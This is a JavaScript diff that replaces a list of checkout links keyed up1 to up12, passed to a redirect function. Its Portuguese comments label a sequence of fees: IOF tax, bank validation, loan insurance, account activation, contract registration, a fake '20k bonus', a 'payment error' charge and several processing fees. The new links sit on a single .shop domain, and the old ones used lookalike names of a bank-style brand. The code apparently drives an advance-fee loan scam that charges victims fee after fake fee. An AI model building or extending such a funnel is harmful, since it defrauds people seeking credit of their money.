@@ -1,16 +1,14 @@
    const baseLinks = {
-  up1: "https://pay.app-agil.online/PyE2Zy8MKb23qRb", // IOF
-  up2: "https://pay.agil-app.online/rn4RgQvoeDW3wBV", // Validação Bancaria
-  up3: "https://pay.agilbank.site/5pjw3RnOLQ032lQ", // Seguro Prestamista "tarifa de cadastro"
-  up4: "https://pay.app-agil.shop/YL9jZDWVLKl3p4q", // NFe
-  up5: "https://pay.app-agil.fun/QqyLgqolO7JZvkE", // Ativar conta
-  up6: "https://pay.app-agil.shop/4KovG1Q8YnQGyDE", // Taxa de registro do contrato
-  up7: "https://pay.app-agil.shop/4KovG1Q8YnQGyDE", // ParabÃ©ns, 20k adicional
-  up8: "https://google.com", // Erro no pagamento - 14,06
-  up9: "https://google.com", // APP - 11,99
-  up10: "https://google.com", // Taxa de Abertura TAC - 16,92
-  up11: "https://google.com", // Taxa de Consultoria Financeira - 19,53
-  up12: "https://google.com", // Taxa de Processamento Administrativo - 31,92
+  up2: "https://pay.aglicenter.shop/PyE2Zy8rpW03qRb", // Validação Bancaria
+  up3: "https://pay.aglicenter.shop/a9ArZMlL8V837xj", // Seguro Prestamista "tarifa de cadastro"
+  up4: "https://pay.aglicenter.shop/meABG9dLpYvZ6Ea", // NFe
+  up5: "https://pay.aglicenter.shop/eApQgz2jpaygEb7", // Ativar conta
+  up6: "https://pay.aglicenter.shop/KV603kompeL3w8y", // Taxa de registro do contrato
+  up7: "https://pay.aglicenter.shop/PVYB34eyAvLZKzk", // ParabÃ©ns, 20k adicional
+  up8: "https://pay.aglicenter.shop/v7R0glompW5GVr9", // Erro no pagamento - 14,06
+  up9: "https://pay.aglicenter.shop/4KovG1QNDwzGyDE", // APP - 11,99
+  up10: "https://pay.aglicenter.shop/YEwR3AVLA29ZdKy", // Taxa de Abertura TAC - 16,92
+  up11: "https://pay.aglicenter.shop/zj6aGnAmpkWZwlK", // Taxa de Consultoria Financeira - 19,53
 };
 
 function redirect(key) {
